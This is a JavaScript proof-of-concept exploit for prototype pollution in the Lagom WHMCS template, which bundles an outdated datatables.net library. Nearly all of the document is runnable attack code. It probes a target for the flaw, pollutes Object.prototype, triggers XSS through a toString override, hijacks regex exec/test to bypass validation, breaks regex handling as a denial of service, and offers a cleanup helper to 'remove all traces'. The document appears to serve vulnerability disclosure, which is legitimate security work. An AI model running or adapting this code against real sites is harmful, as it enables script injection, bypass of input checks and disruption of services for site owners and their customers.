// Prototype Pollution in Lagom WHMCS Template
// Discovered by: S4nnty
// Affected: Lagom WHMCS Template
// Description: The Lagom template bundles an outdated datatables.net (<1.10.23)
// exposing _fnSetObjectDataFn which allows prototype pollution attacks.

(function() {
    console.log('Lagom WHMCS Template Prototype Pollution - Proof of Concept');
    console.log('============================================================');
    
    // Check if target is vulnerable
    function isVulnerable() {
        try {
            if (typeof jQuery === 'undefined' || typeof jQuery.fn.dataTable === 'undefined') {
                return false;
            }
            
            jQuery.fn.dataTable.ext.internal._fnSetObjectDataFn('__proto__.__test')({}, 'vulnerable');
            var vulnerable = ({}).__test === 'vulnerable';
            delete Object.prototype.__test;
            return vulnerable;
        } catch(e) {
            return false;
        }
    }
    
    // Basic pollution test
    function testPollution() {
        console.log('\n[1] Testing prototype pollution...');
        
        try {
            jQuery.fn.dataTable.ext.internal._fnSetObjectDataFn('__proto__.polluted')({}, true);
            
            if (({}).polluted === true) {
                console.log('[+] SUCCESS: Object.prototype successfully polluted');
                console.log('[+] Any newly created object will have .polluted = true');
                return true;
            } else {
                console.log('[-] Failed to pollute prototype');
                return false;
            }
        } catch(e) {
            console.log('[-] Error:', e.message);
            return false;
        }
    }
    
    // XSS via toString pollution
    function testXSS() {
        console.log('\n[2] Testing XSS via toString pollution...');
        
        try {
            var xssPayload = function() {
                alert('XSS Proof of Concept\nDomain: ' + document.domain);
                return '[XSS]';
            };
            
            jQuery.fn.dataTable.ext.internal._fnSetObjectDataFn('__proto__.toString')({}, xssPayload);
            
            var obj = {};
            var str = obj + '';
            console.log('[+] toString() executed - if you saw an alert, XSS works');
            return true;
        } catch(e) {
            console.log('[-] Error:', e.message);
            return false;
        }
    }
    
    // Validation bypass via exec/test pollution
    function testValidationBypass() {
        console.log('\n[3] Testing validation bypass via regex pollution...');
        
        try {
            jQuery.fn.dataTable.ext.internal._fnSetObjectDataFn('__proto__.exec')({}, function(str) {
                console.log('[+] exec() intercepted with input:', str);
                return ['bypassed'];
            });
            
            jQuery.fn.dataTable.ext.internal._fnSetObjectDataFn('__proto__.test')({}, function(str) {
                console.log('[+] test() intercepted with input:', str);
                return true;
            });
            
            var testRegex = /test/;
            var execResult = testRegex.exec('sample');
            var testResult = testRegex.test('sample');
            
            console.log('[+] exec result:', execResult);
            console.log('[+] test result:', testResult);
            console.log('[+] If you see "bypassed" above, validation bypass works');
            return true;
        } catch(e) {
            console.log('[-] Error:', e.message);
            return false;
        }
    }
    
    // Denial of Service via function replacement
    function testDoS() {
        console.log('\n[4] Testing Denial of Service...');
        
        try {
            jQuery.fn.dataTable.ext.internal._fnSetObjectDataFn('__proto__.exec')({}, 'not_a_function');
            jQuery.fn.dataTable.ext.internal._fnSetObjectDataFn('__proto__.test')({}, 'not_a_function');
            
            console.log('[+] exec and test replaced with strings');
            console.log('[+] Any regex operation will now throw errors');
            
            try {
                /test/.exec('test');
            } catch(e) {
                console.log('[+] Expected error occurred:', e.message);
            }
            
            return true;
        } catch(e) {
            console.log('[-] Error:', e.message);
            return false;
        }
    }
    
    // Cleanup function to remove pollution
    function cleanup() {
        console.log('\n[5] Cleaning up...');
        
        var props = [
            'polluted',
            'toString',
            'exec',
            'test'
        ];
        
        props.forEach(function(prop) {
            try {
                delete Object.prototype[prop];
            } catch(e) {}
        });
        
        console.log('[+] Prototype cleaned');
        
        if (typeof RegExp.prototype.exec !== 'function') {
            RegExp.prototype.exec = function(str) {
                return this.originalExec ? this.originalExec(str) : null;
            };
        }
        
        if (typeof RegExp.prototype.test !== 'function') {
            RegExp.prototype.test = function(str) {
                return this.originalTest ? this.originalTest(str) : false;
            };
        }
        
        console.log('[+] Cleanup complete');
    }
    
    // Main execution
    console.log('\nChecking target...');
    
    if (!isVulnerable()) {
        console.log('[-] Target does not appear vulnerable');
        console.log('[-] Exiting...');
        return;
    }
    
    console.log('[+] Target is VULNERABLE');
    console.log('\nRunning Proof of Concept tests...\n');
    
    testPollution();
    testXSS();
    testValidationBypass();
    testDoS();
    
    console.log('\n============================================================');
    console.log('PoC execution complete');
    console.log('============================================================');
    console.log('\nCommands available after execution:');
    console.log('  poc.cleanup()        - Remove all prototype pollution');
    console.log('  poc.status()         - Check current pollution status');
    console.log('  poc.runXSS()         - Run XSS test again');
    console.log('  poc.runBypass()      - Run validation bypass test');
    console.log('  poc.runAll()         - Run all tests again');
    
    // Expose public API
    window.poc = {
        cleanup: cleanup,
        
        status: function() {
            console.log('\nCurrent pollution status:');
            console.log('  polluted:', Object.prototype.polluted === true);
            console.log('  toString modified:', typeof Object.prototype.toString !== 'function');
            console.log('  exec modified:', typeof RegExp.prototype.exec !== 'function');
            console.log('  test modified:', typeof RegExp.prototype.test !== 'function');
        },
        
        runXSS: testXSS,
        runBypass: testValidationBypass,
        runDoS: testDoS,
        
        runAll: function() {
            testPollution();
            testXSS();
            testValidationBypass();
            testDoS();
        },
        
        version: '1.0',
        discoverer: 'S4nnty',
    };
    
    console.log('\nUse poc.cleanup() to remove all traces');
    
})();
